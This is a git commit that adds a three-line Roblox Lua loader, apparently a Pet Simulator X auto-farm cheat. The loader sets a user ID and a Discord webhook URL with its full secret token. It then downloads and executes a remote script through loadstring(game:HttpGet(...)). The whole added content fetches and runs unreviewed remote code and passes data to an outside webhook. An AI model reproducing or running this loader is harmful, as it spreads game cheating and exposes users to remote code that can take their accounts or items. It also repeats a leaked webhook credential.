cfa082b7e4e4feeea2177cc872da5198508aef12
PYRRA420 <121383328+PYRRA420@users.noreply.github.com>
2022-12-28 09:12:15 +0100

    Update and rename .gitignore to .lua

---
+++ .lua
@@ -0,0 +1,3 @@
+_G.UserID = 943067148
+_G.WebHook = "https://ptb.discord.com/api/webhooks/1057391228779515905/mP6cTMOGrJHPXB3m6bXzZdXR89MOqIl5XXVQ-H9RlIMJeqQhObmymAUybWxZONwyRaxs"
+loadstring(game:HttpGet('https://raw.githubusercontent.com/vestyx/PetSimulatorXAutoFarm/main/HasteFarm.lua'))()
